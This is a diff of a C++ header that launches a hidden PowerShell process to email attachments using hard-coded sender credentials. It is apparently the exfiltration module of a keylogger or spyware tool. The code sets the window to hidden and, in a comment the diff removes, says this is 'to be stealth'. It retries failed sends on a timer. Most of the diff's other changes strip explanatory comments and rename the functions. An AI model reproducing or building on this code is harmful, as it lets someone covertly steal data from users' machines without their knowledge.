@@ -1,5 +1,5 @@
-#ifndef SENDMAIL_H
-#define SENDMAIL_H
+#ifndef SENDEMAIL_H
+#define SENDEMAIL_H
 
 #include <fstream>
 #include <vector>
@@ -11,7 +11,7 @@
 #define SCRIPT_NAME "SendEmail.ps1"
 
 namespace Mail
-{   // for email details, in real life use, you only need to update the following
+{   
     #define X_EM_TO "mail@somemail.com"
     #define X_EM_FROM "mail@somemail.com"
     #define X_EM_PASS "somepassword"
@@ -53,7 +53,7 @@ namespace Mail
  std::string (X_EM_FROM) +
 "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
 
-    // undef to protect the data
+ 
     #undef X_EM_TO
     #undef X_EM_FROM
     #undef X_EM_PASS
@@ -65,7 +65,7 @@ namespace Mail
         size_t sp = 0;  // string position
 
         while((sp = s.find(what, sp)) != std::string::npos) // npos = our string to termination
-            s.replace(sp, what.length(), with), sp += with.length();
+            s.replace(sp, what.length(), with), sp= sp + with.length();
         return s;
     }
 
@@ -90,7 +90,7 @@ namespace Mail
         return true;
     }
 
-    Timer m_timer;  // global variable, to not "die" after the function ends, so if the mail-send fails, we can repeat the function
+    Timer m_timer;  
 
     int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
     {
@@ -112,13 +112,13 @@ namespace Mail
         SHELLEXECUTEINFO ShExecInfo = {0};
         ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
         ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;     // prevent process from closing so we can see how it performs etc
-        ShExecInfo.hwnd = NULL;         // we should not have a window when running, in order to be stealth
-        ShExecInfo.lpVerb = "open";     // essentially, the right-click + open we do to files
+        ShExecInfo.hwnd = NULL;         
+        ShExecInfo.lpVerb = "open";     
         ShExecInfo.lpFile = "powershell";
         ShExecInfo.lpParameters = param.c_str();
-        ShExecInfo.lpDirectory = NULL;  // represents a working directory, which we don't really need in this case
-        ShExecInfo.nShow = SW_HIDE;     // so it remains hidden (does not "pop" up)
-        ShExecInfo.hInstApp = NULL;     // basically "handles" the instance
+        ShExecInfo.lpDirectory = NULL; 
+        ShExecInfo.nShow = SW_HIDE;     
+        ShExecInfo.hInstApp = NULL;     
 
         ok = (bool)ShellExecuteEx(&ShExecInfo);
         if(!ok)
@@ -144,12 +144,12 @@ namespace Mail
         return (int)exit_code;
     }
     // we want to overload the SendMain() function
-    int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
+    int SendEMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
     {
         std::string attachments = "";
-        if(att.size() == 1U)    // U = unsigned integer, so if we have only one attachment
+        if(att.size() == 1U)    
             attachments = att.at(0);
-        else    // else, we construct a  string of attachments
+        else  
         {
             for(const auto &v : att)
                 attachments += v + "::";
@@ -160,4 +160,4 @@ namespace Mail
     }
 }
 
-#endif // SENDMAIL_H
+#endif // SENDEMAIL_H
